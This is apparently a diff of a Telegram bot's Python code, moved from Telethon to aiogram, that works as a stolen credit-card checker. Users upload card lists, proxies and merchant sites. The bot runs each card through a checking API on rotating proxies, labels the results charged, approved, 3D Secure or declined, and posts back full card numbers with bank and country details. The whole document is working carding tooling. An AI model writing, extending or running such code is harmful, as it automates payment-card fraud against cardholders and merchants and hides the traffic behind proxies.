+        await cq.answer("❌ No proxies to remove!", show_alert=True)
+    await _show_my_proxies(cq)
 
-# ==================== FILE HANDLING ====================
-async def handle_file_upload(event):
-    user_id = event.sender_id
-    
-    if user_id not in active_processes:
-        await event.reply("❌ Please use the buttons first.")
-        return
-    
-    process_type = active_processes[user_id].get('type')
-    
-    if process_type == 'waiting_cards':
-        await process_cards_file(event)
-    elif process_type == 'waiting_sites':
-        await process_sites_file(event)
-    elif process_type == 'waiting_proxies':
-        await process_proxies_file(event)
-    else:
-        await event.reply("❌ Invalid state. Please start over.")
-
-async def process_sites_file(event):
-    user_id = event.sender_id
-    str_user_id = str(user_id)
-    file_path = await event.message.download_media()
-    
-    try:
-        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
-            content = await f.read()
-    except:
-        async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
-            content = await f.read()
-    
-    os.remove(file_path)
-    
-    lines = content.splitlines()
-    if len(lines) > MAX_SITES_FILE:
-        await event.reply(
-            f"━━━━━━━━━━━━━━\n"
-            f"❌ FILE TOO LARGE\n"
-            f"━━━━━━━━━━━━━\n\n"
-            f"Your file has {len(lines)} sites.\n"
-            f"Maximum allowed is {MAX_SITES_FILE} sites."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    sites_to_test = []
-    for line in lines:
-        line = line.strip()
-        if line:
-            line = line.replace('https://', '').replace('http://', '').split('/')[0]
-            if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', line):
-                sites_to_test.append(line)
-    
-    if not sites_to_test:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO VALID SITES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "No valid sites found in your file."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies_data.get(str_user_id, [])
-    
-    if not user_proxies:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO PROXY\n"
-            "━━━━━━━━━━━━━\n\n"
-            "You need at least one working proxy to test sites.\n"
-            "Add proxies first."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    status_msg = await event.reply(f"🍑 Testing {len(sites_to_test)} sites...")
-    
-    proxy = random.choice(user_proxies)['url']
-    working_sites = []
-    
-    for i, site in enumerate(sites_to_test, 1):
+@dp.callback_query(F.data.startswith("stop:"))
+async def cb_stop(cq: CallbackQuery):
+    target_uid = int(cq.data.split(":")[1])
+    if cq.from_user.id != target_uid:
+        return await cq.answer("❌ Not your process!", show_alert=True)
+    if target_uid in active_processes:
+        active_processes.pop(target_uid, None)
+        await cq.answer("⛔ Stopped!", show_alert=True)
         try:
-            await status_msg.edit(f"🍑 Testing sites... [{i}/{len(sites_to_test)}]")
+            await cq.message.edit_text("`⛔ Process stopped by user`", parse_mode="Markdown")
         except:
             pass
-        
-        result = await test_site_via_api(site, proxy)
-        
-        if result.get('working'):
-            working_sites.append(site)
-        
-        await asyncio.sleep(0.5)
-    
+    else:
+        await cq.answer("❌ No active process!", show_alert=True)
+
+# ==================== SHARED DISPLAY FUNCTIONS ====================
+
+async def _show_my_sites(target):
+    """target = CallbackQuery or Message"""
+    if isinstance(target, CallbackQuery):
+        user_id = str(target.from_user.id)
+        edit_fn = target.message.edit_text
+        send_fn = target.message.answer
+    else:
+        user_id = str(target.from_user.id)
+        edit_fn = None
+        send_fn = target.reply
+
     sites_data = await load_json(USER_SITES_FILE)
-    current_sites = sites_data.get(str_user_id, [])
-    
-    added = []
-    for site in working_sites:
-        if site not in current_sites and len(current_sites) < MAX_SITES:
-            current_sites.append(site)
-            added.append(site)
-        if len(current_sites) >= MAX_SITES:
-            break
-    
-    if added:
-        sites_data[str_user_id] = current_sites
-        await save_json(USER_SITES_FILE, sites_data)
-    
-    response = f"""
-━━━━━━━━━━━━━━━━━
-✅ SITES PROCESSED
-━━━━━━━━━━━━━━━━━
+    user_sites = sites_data.get(user_id, [])
 
-📊 Total in file: {len(sites_to_test)}
-🟢 Working: {len(working_sites)}
-✅ Added to your list: {len(added)}
-📊 Total now: {len(current_sites)}/{MAX_SITES}
-
-"""
-    
-    if added:
-        response += "Added:\n"
-        for site in added[:5]:
-            response += f"• `{site}`\n"
-        if len(added) > 5:
-            response += f"... and {len(added)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK", b"back_to_main")]]
-    
-    await status_msg.edit(response, buttons=buttons)
-    
-    active_processes.pop(user_id, None)
-
-async def process_proxies_file(event):
-    user_id = event.sender_id
-    str_user_id = str(user_id)
-    file_path = await event.message.download_media()
-    
-    try:
-        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
-            content = await f.read()
-    except:
-        async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
-            content = await f.read()
-    
-    os.remove(file_path)
-    
-    lines = content.splitlines()
-    if len(lines) > MAX_PROXIES_FILE:
-        await event.reply(
-            f"━━━━━━━━━━━━━━\n"
-            f"❌ FILE TOO LARGE\n"
-            f"━━━━━━━━━━━━━\n\n"
-            f"Your file has {len(lines)} proxies.\n"
-            f"Maximum allowed is {MAX_PROXIES_FILE} proxies."
+    if not user_sites:
+        text = (
+            "┏━━━━━━━━━━━━━━━━┓\n"
+            f"┃ ❌ {format_bold('You have no saved sites.')}\n"
+            f"┃ {format_bold('Use ADD SITES to add some.')}\n"
+            "┗━━━━━━━━━━━━━━━━┛"
         )
+        markup = kb_back_main()
+    else:
+        site_list = "".join(f" {i}. `{s}`\n" for i, s in enumerate(user_sites, 1))
+        text = (
+            "┏━━━━━━━━━━━━━━━━┓\n"
+            f"┃ 📊 {format_bold('Total')}: {len(user_sites)}/{MAX_SITES}\n\n"
+            f"{site_list}"
+            "┗━━━━━━━━━━━━━━━━┛"
+        )
+        markup = kb_sites_list(user_sites)
+
+    if edit_fn:
+        try:
+            await edit_fn(text, reply_markup=markup, parse_mode="Markdown")
+            return
+        except:
+            pass
+    await send_fn(text, reply_markup=markup, parse_mode="Markdown")
+
+async def _show_my_proxies(target):
+    if isinstance(target, CallbackQuery):
+        user_id = str(target.from_user.id)
+        edit_fn = target.message.edit_text
+        send_fn = target.message.answer
+    else:
+        user_id = str(target.from_user.id)
+        edit_fn = None
+        send_fn = target.reply
+
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    user_proxies = proxies_data.get(user_id, [])
+
+    if not user_proxies:
+        text = (
+            "┏━━━━━━━━━━━━━━━━┓\n"
+            f"┃ ❌ {format_bold('You have no saved proxies.')}\n"
+            f"┃ {format_bold('Use ADD PROXY to add some.')}\n"
+            "┗━━━━━━━━━━━━━━━━┛"
+        )
+        markup = kb_back_main()
+    else:
+        plist = "".join(f" {i}. `{p['original']}`\n" for i, p in enumerate(user_proxies, 1))
+        text = (
+            "┏━━━━━━━━━━━━━━━━┓\n"
+            f"┃ 📊 {format_bold('Total')}: {len(user_proxies)}/{MAX_PROXIES}\n\n"
+            f"{plist}"
+            "┗━━━━━━━━━━━━━━━━┛"
+        )
+        markup = kb_proxies_list(user_proxies)
+
+    if edit_fn:
+        try:
+            await edit_fn(text, reply_markup=markup, parse_mode="Markdown")
+            return
+        except:
+            pass
+    await send_fn(text, reply_markup=markup, parse_mode="Markdown")
+
+async def _start_test_sites(cq: CallbackQuery):
+    user_id = str(cq.from_user.id)
+    int_uid  = cq.from_user.id
+
+    if int_uid in active_processes and active_processes[int_uid].get('type') not in [
+        'waiting_sites', 'waiting_proxies', 'waiting_cards'
+    ]:
+        return await cq.answer("❌ You already have an active process!", show_alert=True)
+
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    user_proxies = proxies_data.get(user_id, [])
+    if not user_proxies:
+        return await cq.answer("❌ You need at least one working proxy!", show_alert=True)
+
+    sites_data = await load_json(USER_SITES_FILE)
+    user_sites = sites_data.get(user_id, [])
+    if not user_sites:
+        return await cq.answer("❌ You have no sites to test!", show_alert=True)
+
+    active_processes[int_uid] = {'type': 'testing_sites'}
+
+    try:
+        await cq.message.edit_text("🍑 Preparing to test your sites...")
+    except:
+        pass
+
+    proxy = random.choice(user_proxies)['url']
+    working, dead = [], []
+
+    for i, site in enumerate(user_sites, 1):
+        try:
+            await cq.message.edit_text(f"🍑 Testing sites... [{i}/{len(user_sites)}]")
+        except:
+            pass
+        result = await test_site_via_api(site, proxy)
+        (working if result.get('working') else dead).append(site)
+        await asyncio.sleep(0.5)
+
+    if dead:
+        sites_data[user_id] = working
+        await save_json(USER_SITES_FILE, sites_data)
+
+    text = (
+        "𖣐━━━━━━━━━━━━━━𖣐\n"
+        f"✅ {format_bold('SITE TEST COMPLETE')}\n"
+        "𖣐━━━━━━━━━━━━━━𖣐\n\n"
+        f"📊 Total: {len(user_sites)} | 🟢 Working: {len(working)} | 🔴 Dead: {len(dead)}\n"
+    )
+    if dead:
+        text += f"\n🔴 Dead removed:\n" + "".join(f"• `{s}`\n" for s in dead[:5])
+        if len(dead) > 5:
+            text += f"... and {len(dead)-5} more\n"
+
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+
+    active_processes.pop(int_uid, None)
+
+async def _start_test_proxies(cq: CallbackQuery):
+    user_id = str(cq.from_user.id)
+    int_uid  = cq.from_user.id
+
+    if int_uid in active_processes and active_processes[int_uid].get('type') not in [
+        'waiting_sites', 'waiting_proxies', 'waiting_cards'
+    ]:
+        return await cq.answer("❌ You already have an active process!", show_alert=True)
+
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    user_proxies = proxies_data.get(user_id, [])
+    if not user_proxies:
+        return await cq.answer("❌ You have no proxies to test!", show_alert=True)
+
+    active_processes[int_uid] = {'type': 'testing_proxies'}
+
+    try:
+        await cq.message.edit_text("🍑 Preparing to test your proxies...")
+    except:
+        pass
+
+    working, dead = [], []
+    for i, pd in enumerate(user_proxies, 1):
+        try:
+            await cq.message.edit_text(f"🍑 Testing proxies... [{i}/{len(user_proxies)}]")
+        except:
+            pass
+        ok, _ = await test_proxy(pd['url'])
+        (working if ok else dead).append(pd)
+        await asyncio.sleep(0.5)
+
+    if dead:
+        proxies_data[user_id] = working
+        await save_json(USER_PROXIES_FILE, proxies_data)
+
+    text = (
+        "𖣐━━━━━━━━━━━━━━𖣐\n"
+        f"✅ {format_bold('PROXY TEST COMPLETE')}\n"
+        "𖣐━━━━━━━━━━━━━━𖣐\n\n"
+        f"📊 Total: {len(user_proxies)} | 🟢 Working: {len(working)} | 🔴 Dead: {len(dead)}\n"
+    )
+    if dead:
+        text += "\n🔴 Dead removed:\n" + "".join(f"• `{p['original']}`\n" for p in dead[:5])
+        if len(dead) > 5:
+            text += f"... and {len(dead)-5} more\n"
+
+    try:
+        await cq.message.edit_text(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+    except:
+        await cq.message.answer(text, reply_markup=kb_back_main(), parse_mode="Markdown")
+
+    active_processes.pop(int_uid, None)
+
+# ==================== MESSAGE HANDLER (files + text) ====================
+
+@dp.message(F.document | F.text)
+async def handle_message(message: Message):
+    user_id = message.from_user.id
+
+    if user_id not in active_processes:
+        return
+
+    ptype = active_processes[user_id].get('type')
+
+    if message.document:
+        if ptype == 'waiting_cards':
+            await process_cards_file(message)
+        elif ptype == 'waiting_sites':
+            await process_sites_file(message)
+        elif ptype == 'waiting_proxies':
+            await process_proxies_file(message)
+    elif message.text and not message.text.startswith('/'):
+        if ptype == 'waiting_sites':
+            await process_sites_text(message)
+        elif ptype == 'waiting_proxies':
+            await process_proxies_text(message)
+
+# ==================== FILE PROCESSORS ====================
+
+async def _download_doc(message: Message) -> str | None:
+    if not message.document:
+        return None
+    file_info = await bot.get_file(message.document.file_id)
+    path = f"/tmp/{message.document.file_name or 'upload.txt'}"
+    await bot.download_file(file_info.file_path, path)
+    return path
+
+async def _read_file(path: str) -> str:
+    try:
+        async with aiofiles.open(path, 'r', encoding='utf-8') as f:
+            return await f.read()
+    except:
+        async with aiofiles.open(path, 'r', encoding='latin-1') as f:
+            return await f.read()
+
+async def process_cards_file(message: Message):
+    user_id = message.from_user.id
+    str_uid = str(user_id)
+
+    path = await _download_doc(message)
+    if not path:
+        return
+    content = await _read_file(path)
+    os.remove(path)
+
+    if len(content.splitlines()) > MAX_CARDS_FILE:
+        await message.reply(f"❌ File too large. Max {MAX_CARDS_FILE} cards.")
         active_processes.pop(user_id, None)
         return
-    
+
+    cards = extract_cards(content)
+    if not cards:
+        await message.reply("`❌ No valid cards found in file!`", parse_mode="Markdown")
+        active_processes.pop(user_id, None)
+        return
+
+    sites_data   = await load_json(USER_SITES_FILE)
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    user_sites   = sites_data.get(str_uid, [])
+    user_proxies = proxies_data.get(str_uid, [])
+
+    if not user_sites:
+        await message.reply("❌ No saved sites. Add sites first.")
+        active_processes.pop(user_id, None)
+        return
+    if not user_proxies:
+        await message.reply("❌ No saved proxies. Add proxies first.")
+        active_processes.pop(user_id, None)
+        return
+
+    active_processes[user_id]['type'] = 'checking_cards'
+    await process_card_check(message, cards[:MAX_CARDS], user_sites, user_proxies)
+
+async def process_sites_file(message: Message):
+    user_id = message.from_user.id
+    str_uid = str(user_id)
+
+    path = await _download_doc(message)
+    if not path:
+        await message.reply("❌ Failed to download file.")
+        active_processes.pop(user_id, None)
+        return
+    content = await _read_file(path)
+    os.remove(path)
+
+    await _process_sites_content(message, content, str_uid, user_id)
+
+async def process_sites_text(message: Message):
+    user_id = message.from_user.id
+    str_uid = str(user_id)
+    content = message.text.strip()
+    await _process_sites_content(message, content, str_uid, user_id)
+
+async def _process_sites_content(message: Message, content: str, str_uid: str, user_id: int):
+    lines = content.splitlines()
+    if len(lines) > MAX_SITES_FILE:
+        await message.reply(f"❌ Too many sites. Max {MAX_SITES_FILE}.")
+        active_processes.pop(user_id, None)
+        return
+
+    sites_to_test = []
+    for line in lines:
+        line = line.strip().replace('https://', '').replace('http://', '').split('/')[0]
+        if line and re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', line):
+            sites_to_test.append(line)
+
+    if not sites_to_test:
+        await message.reply("❌ No valid sites found.")
+        active_processes.pop(user_id, None)
+        return
+
+    proxies_data = await load_json(USER_PROXIES_FILE)
+    user_proxies = proxies_data.get(str_uid, [])
+    if not user_proxies:
+        await message.reply("❌ You need at least one working proxy.")
+        active_processes.pop(user_id, None)
+        return
+
+    status_msg = await message.reply(f"🍑 Testing {len(sites_to_test)} sites...")
+    proxy = random.choice(user_proxies)['url']
+    working = []
+
+    for i, site in enumerate(sites_to_test, 1):
+        try:
+            await status_msg.edit_text(f"🍑 Testing sites... [{i}/{len(sites_to_test)}]")
+        except:
+            pass
+        result = await test_site_via_api(site, proxy)
+        if result.get('working'):
+            working.append(site)
+        await asyncio.sleep(0.5)
+
+    sites_data = await load_json(USER_SITES_FILE)
+    current = sites_data.get(str_uid, [])
+    added = []
+    for site in working:
+        if site not in current and len(current) < MAX_SITES:
+            current.append(site)
+            added.append(site)
+        if len(current) >= MAX_SITES:
+            break
+
+    if added:
+        sites_data[str_uid] = current
+        await save_json(USER_SITES_FILE, sites_data)
+
+    resp = (
+        "━━━━━━━━━━━━━━━━━\n✅ SITES PROCESSED\n━━━━━━━━━━━━━━━━━\n\n"
+        f"📊 Total sent: {len(sites_to_test)}\n"
+        f"🟢 Working: {len(working)}\n"
+        f"✅ Added: {len(added)}\n"
+        f"📊 Total now: {len(current)}/{MAX_SITES}\n"
+    )
+    if added:
+        resp += "\nAdded:\n" + "".join(f"• `{s}`\n" for s in added[:5])
+        if len(added) > 5:
+            resp += f"... and {len(added)-5} more\n"
+
+    await status_msg.edit_text(resp, reply_markup=kb_back_main(), parse_mode="Markdown")
+    active_processes.pop(user_id, None)
+
+async def process_proxies_file(message: Message):
+    user_id = message.from_user.id
+    str_uid = str(user_id)
+
+    path = await _download_doc(message)
+    if not path:
+        await message.reply("❌ Failed to download file.")
+        active_processes.pop(user_id, None)
+        return
+    content = await _read_file(path)
+    os.remove(path)
+
+    await _process_proxies_content(message, content, str_uid, user_id)
+
+async def process_proxies_text(message: Message):
+    user_id = message.from_user.id
+    str_uid = str(user_id)
+    content = message.text.strip()
+    await _process_proxies_content(message, content, str_uid, user_id)
+
+async def _process_proxies_content(message: Message, content: str, str_uid: str, user_id: int):
+    lines = content.splitlines()
+    if len(lines) > MAX_PROXIES_FILE:
+        await message.reply(f"❌ Too many proxies. Max {MAX_PROXIES_FILE}.")
+        active_processes.pop(user_id, None)
+        return
+
     proxies_to_test = []
     for line in lines:
         line = line.strip()
         if line:
-            proxy_url = parse_proxy(line)
-            if proxy_url:
-                proxies_to_test.append((line, proxy_url))
-    
+            url = parse_proxy(line)
+            if url:
+                proxies_to_test.append((line, url))
+
     if not proxies_to_test:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO VALID PROXIES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "No valid proxies found in your file."
-        )
+        await message.reply("❌ No valid proxies found.")
         active_processes.pop(user_id, None)
         return
-    
-    status_msg = await event.reply(f"🍑 Testing {len(proxies_to_test)} proxies...")
-    
-    working_proxies = []
-    
-    for i, (original, url) in enumerate(proxies_to_test, 1):
+
+    status_msg = await message.reply(f"🍑 Testing {len(proxies_to_test)} proxies...")
+    working = []
+
+    for i, (orig, url) in enumerate(proxies_to_test, 1):
         try:
-            await status_msg.edit(f"🍑 Testing proxies... [{i}/{len(proxies_to_test)}]")
+            await status_msg.edit_text(f"🍑 Testing proxies... [{i}/{len(proxies_to_test)}]")
         except:
             pass
-        
-        is_working, ip = await test_proxy(url)
-        
-        if is_working:
-            working_proxies.append({
-                'original': original,
-                'url': url,
-                'ip': ip
-            })
-        
+        ok, ip = await test_proxy(url)
+        if ok:
+            working.append({'original': orig, 'url': url, 'ip': ip})
         await asyncio.sleep(0.5)
-    
+
     proxies_data = await load_json(USER_PROXIES_FILE)
-    current_proxies = proxies_data.get(str_user_id, [])
-    
+    current = proxies_data.get(str_uid, [])
     added = []
-    for proxy in working_proxies:
-        exists = any(p['original'] == proxy['original'] for p in current_proxies)
-        if not exists and len(current_proxies) < MAX_PROXIES:
-            current_proxies.append(proxy)
-            added.append(proxy['original'])
-        if len(current_proxies) >= MAX_PROXIES:
+    for p in working:
+        if not any(x['original'] == p['original'] for x in current) and len(current) < MAX_PROXIES:
+            current.append(p)
+            added.append(p['original'])
+        if len(current) >= MAX_PROXIES:
             break
-    
+
     if added:
-        proxies_data[str_user_id] = current_proxies
+        proxies_data[str_uid] = current
         await save_json(USER_PROXIES_FILE, proxies_data)
-    
-    response = f"""
-━━━━━━━━━━━━━━━━━
-✅ PROXIES PROCESSED
-━━━━━━━━━━━━━━━━━
 
-📊 Total in file: {len(proxies_to_test)}
-🟢 Working: {len(working_proxies)}
-✅ Added to your list: {len(added)}
-📊 Total now: {len(current_proxies)}/{MAX_PROXIES}
-
-"""
-    
+    resp = (
+        "━━━━━━━━━━━━━━━━━\n✅ PROXIES PROCESSED\n━━━━━━━━━━━━━━━━━\n\n"
+        f"📊 Total sent: {len(proxies_to_test)}\n"
+        f"🟢 Working: {len(working)}\n"
+        f"✅ Added: {len(added)}\n"
+        f"📊 Total now: {len(current)}/{MAX_PROXIES}\n"
+    )
     if added:
-        response += "Added:\n"
-        for proxy in added[:5]:
-            response += f"• `{proxy}`\n"
+        resp += "\nAdded:\n" + "".join(f"• `{p}`\n" for p in added[:5])
         if len(added) > 5:
-            response += f"... and {len(added)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK", b"back_to_main")]]
-    
-    await status_msg.edit(response, buttons=buttons)
-    
+            resp += f"... and {len(added)-5} more\n"
+
+    await status_msg.edit_text(resp, reply_markup=kb_back_main(), parse_mode="Markdown")
     active_processes.pop(user_id, None)
 
-async def process_cards_file(event):
-    user_id = event.sender_id
-    str_user_id = str(user_id)
-    file_path = await event.message.download_media()
-    
-    try:
-        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
-            content = await f.read()
-    except:
-        async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
-            content = await f.read()
-    
-    os.remove(file_path)
-    
-    lines = content.splitlines()
-    if len(lines) > MAX_CARDS_FILE:
-        await event.reply(
-            f"━━━━━━━━━━━━━━\n"
-            f"❌ FILE TOO LARGE\n"
-            f"━━━━━━━━━━━━━\n\n"
-            f"Your file has {len(lines)} cards.\n"
-            f"Maximum allowed is {MAX_CARDS_FILE} cards."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    cards = extract_cards(content)
-    
-    if not cards:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO VALID CARDS\n"
-            "━━━━━━━━━━━━━\n\n"
-            "No valid cards found in your file."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    if len(cards) > MAX_CARDS:
-        cards = cards[:MAX_CARDS]
-        await event.reply(f"⚠️ File has more than {MAX_CARDS} cards. Checking only first {MAX_CARDS}.")
-    
-    sites_data = await load_json(USER_SITES_FILE)
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    
-    user_sites = sites_data.get(str_user_id, [])
-    user_proxies = proxies_data.get(str_user_id, [])
-    
-    if not user_sites:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO SITES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "You have no saved sites.\n"
-            "Add sites first using '🌐 ADD SITES'."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    if not user_proxies:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO PROXIES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "You have no saved proxies.\n"
-            "Add proxies first using '🔌 ADD PROXIES'."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    active_processes[user_id]['type'] = 'checking_cards'
-    
-    await process_card_check(event, cards, user_sites, user_proxies)
+# ==================== CARD CHECKER ====================
 
-async def process_card_check(event, cards, sites, proxies):
-    user_id = event.sender_id
+async def process_card_check(message: Message, cards: list, sites: list, proxies: list):
+    user_id = message.from_user.id
     total = len(cards)
-    checked = 0
-    approved = 0
-    charged = 0
-    threed = 0
-    declined = 0
-    status_msg = await event.reply("```🍑 Preparing your lunch...```")
-    
+    checked = approved = charged = threed = declined = 0
+
+    status_msg = await message.reply("`🍑 Preparing your lunch...`", parse_mode="Markdown")
+
     try:
-        for card in cards:  
-            if user_id not in active_processes or active_processes[user_id].get('type') != 'checking_cards':
+        for card in cards:
+            if user_id not in active_processes or \
+               active_processes[user_id].get('type') != 'checking_cards':
                 break
-            
             if not sites:
                 break
-            
-            site = random.choice(sites)
+
+            site  = random.choice(sites)
             proxy = random.choice(proxies)['url']
-            
-            
             result = await check_card_via_api(card, site, proxy)
-            
             checked += 1
-            
+
             if isinstance(result, Exception):
                 declined += 1
                 await asyncio.sleep(3)
                 continue
-            
+
             status = get_card_status(result.get('Response', ''), result.get('Status', ''))
-            
+
             if status:
-                if "CHARGED" in status:
-                    charged += 1
-                elif "APPROVED" in status:
-                    approved += 1
-                elif "3D" in status:
-                    threed += 1
-                
+                if "CHARGED"  in status: charged  += 1
+                elif "APPROVED" in status: approved += 1
+                elif "3D"     in status: threed   += 1
+
                 bin_info = await get_bin_info(card.split('|')[0])
-                
-                card_msg = f"""
-{status}
-
-CC ⇾ `{card}`
-Gateway ⇾ {result.get('Gateway', 'Unknown')}
-Response ⇾ {result.get('Response', 'Unknown')}
-Price ⇾ {result.get('Price', '-')} 💸
-
-```BIN Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-Bank: {bin_info['bank']}
-Country: {bin_info['country']} {bin_info['flag']}```
-"""
-                await event.reply(card_msg)
+                card_msg = (
+                    f"{status}\n\n"
+                    f"CC ⇾ `{card}`\n"
+                    f"Gateway ⇾ {result.get('Gateway', 'Unknown')}\n"
+                    f"Response ⇾ {result.get('Response', 'Unknown')}\n"
+                    f"Price ⇾ {result.get('Price', '-')} 💸\n\n"
+                    f"```BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
+                    f"Bank: {bin_info['bank']}\n"
+                    f"Country: {bin_info['country']} {bin_info['flag']}```"
+                )
+                await message.reply(card_msg, parse_mode="Markdown")
             else:
                 declined += 1
-            
-            progress_text = f"""```🍑 Progress```"""
-            buttons = [
-                [Button.inline(f"Card ➜ {card[:12]}****", f"none_{user_id}")],
-                [Button.inline(f"Response ➜ {result.get('Response', '')[:25]}...", f"none_{user_id}")],
-                [Button.inline(f"Site ➜ [1]", f"none_{user_id}")],
-                [Button.inline(f"CHARGE ➜ [ {charged} ] 💎", f"none_{user_id}")],
-                [Button.inline(f"Approve ➜ [ {approved} ] 🔥", f"none_{user_id}")],
-                [Button.inline(f"3D SECURE ➜ [ {threed} ] 🟡", f"none_{user_id}")],
-                [Button.inline(f"Decline ➜ [ {declined} ] ❌", f"none_{user_id}")],
-                [Button.inline(f"Progress ➜ [{checked}/{total}] ✅", f"none_{user_id}")],
-                [Button.inline("⛔ Stop", f"stop:{user_id}")]
-            ]
-            
+
             try:
-                await status_msg.edit(progress_text, buttons=buttons)
+                await status_msg.edit_text(
+                    "`🍑 Progress`",
+                    parse_mode="Markdown",
+                    reply_markup=kb_progress(
+                        card, result.get('Response', '')[:28],
+                        charged, approved, threed, declined,
+                        checked, total, user_id
+                    )
+                )
             except:
                 pass
-            
-            await asyncio.sleep(3)  
-    
+
+            await asyncio.sleep(3)
+
     finally:
-        if user_id in active_processes:
-            active_processes.pop(user_id, None)
-        
-        final = f"""```✅ CHECK COMPLETE!
-
-Total Cards: {total}
-CHARGED 💎 : {charged}
-APPROVED ✅ : {approved}
-3D SECURE 🟡 : {threed}
-DECLINED ❌ : {declined}```"""
-        
-        await status_msg.edit(final)
-
-async def handle_text_input(event):
-    user_id = event.sender_id
-    
-    if user_id not in active_processes:
-        return
-    
-    process_type = active_processes[user_id].get('type')
-    
-    if process_type == 'waiting_sites':
-        await process_sites_text(event)
-    elif process_type == 'waiting_proxies':
-        await process_proxies_text(event)
-    else:
-        await event.reply("❌ Please send a file instead.")
-
-async def process_sites_text(event):
-    user_id = event.sender_id
-    str_user_id = str(user_id)
-    text = event.message.text.strip()
-    
-    lines = text.splitlines()
-    if len(lines) > MAX_SITES_FILE:
-        await event.reply(
-            f"━━━━━━━━━━━━━━\n"
-            f"❌ TOO MANY SITES\n"
-            f"━━━━━━━━━━━━━\n\n"
-            f"You sent {len(lines)} sites.\n"
-            f"Maximum allowed is {MAX_SITES_FILE} sites."
-        )
         active_processes.pop(user_id, None)
-        return
-    
-    sites_to_test = []
-    for line in lines:
-        line = line.strip()
-        if line:
-            line = line.replace('https://', '').replace('http://', '').split('/')[0]
-            if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', line):
-                sites_to_test.append(line)
-    
-    if not sites_to_test:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO VALID SITES\n"
-            "━━━━━━━━━━━━━\n\n"
-            "No valid sites found."
+        final = (
+            "```✅ CHECK COMPLETE!\n\n"
+            f"Total Cards : {total}\n"
+            f"CHARGED 💎  : {charged}\n"
+            f"APPROVED ✅  : {approved}\n"
+            f"3D SECURE 🟡: {threed}\n"
+            f"DECLINED ❌  : {declined}```"
         )
-        active_processes.pop(user_id, None)
-        return
-    
-    proxies_data = await load_json(USER_PROXIES_FILE)
-    user_proxies = proxies_data.get(str_user_id, [])
-    
-    if not user_proxies:
-        await event.reply(
-            "━━━━━━━━━━━━━━\n"
-            "❌ NO PROXY\n"
-            "━━━━━━━━━━━━━\n\n"
-            "You need at least one working proxy to test sites.\n"
-            "Add proxies first."
-        )
-        active_processes.pop(user_id, None)
-        return
-    
-    status_msg = await event.reply(f"🍑 Testing {len(sites_to_test)} sites...")
-    
-    proxy = random.choice(user_proxies)['url']
-    working_sites = []
-    
-    for i, site in enumerate(sites_to_test, 1):
         try:
-            await status_msg.edit(f"🍑 Testing sites... [{i}/{len(sites_to_test)}]")
+            await status_msg.edit_text(final, parse_mode="Markdown")
         except:
-            pass
-        
-        result = await test_site_via_api(site, proxy)
-        
-        if result.get('working'):
-            working_sites.append(site)
-        
-        await asyncio.sleep(0.5)
-    
-    sites_data = await load_json(USER_SITES_FILE)
-    current_sites = sites_data.get(str_user_id, [])
-    
-    added = []
-    for site in working_sites:
-        if site not in current_sites and len(current_sites) < MAX_SITES:
-            current_sites.append(site)
-            added.append(site)
-        if len(current_sites) >= MAX_SITES:
-            break
-    
-    if added:
-        sites_data[str_user_id] = current_sites
-        await save_json(USER_SITES_FILE, sites_data)
-    
-    response = f"""
-━━━━━━━━━━━━━━━━━
-✅ SITES PROCESSED
-━━━━━━━━━━━━━━━━━
-
-📊 Total sent: {len(sites_to_test)}
-🟢 Working: {len(working_sites)}
-✅ Added to your list: {len(added)}
-📊 Total now: {len(current_sites)}/{MAX_SITES}
-
-"""
-    
-    if added:
-        response += "Added:\n"
-        for site in added[:5]:
-            response += f"• `{site}`\n"
-        if len(added) > 5:
-            response += f"... and {len(added)-5} more\n"
-    
-    buttons = [[Button.inline("🔙 BACK", b"back_to_main")]]
-    
-    await status_msg.edit(response, buttons=buttons)
-    
-    active_processes.pop(user_id, None)
-
-async def process_proxies_text(event):
-    user_id = event.sender_id
-    str_user_id = str(user_id)
-    text = event.message.text.strip()
-    
-    lines = text.splitlines()
-    if len(lines) > MAX_PROXIES_FILE:
-        await event.reply(
-            f"━━━━━━━━━━━━━━\n"
-            f"❌ TOO MANY PROXIES\n"
-            f"━━━━━━━━━━━━━\n\n"
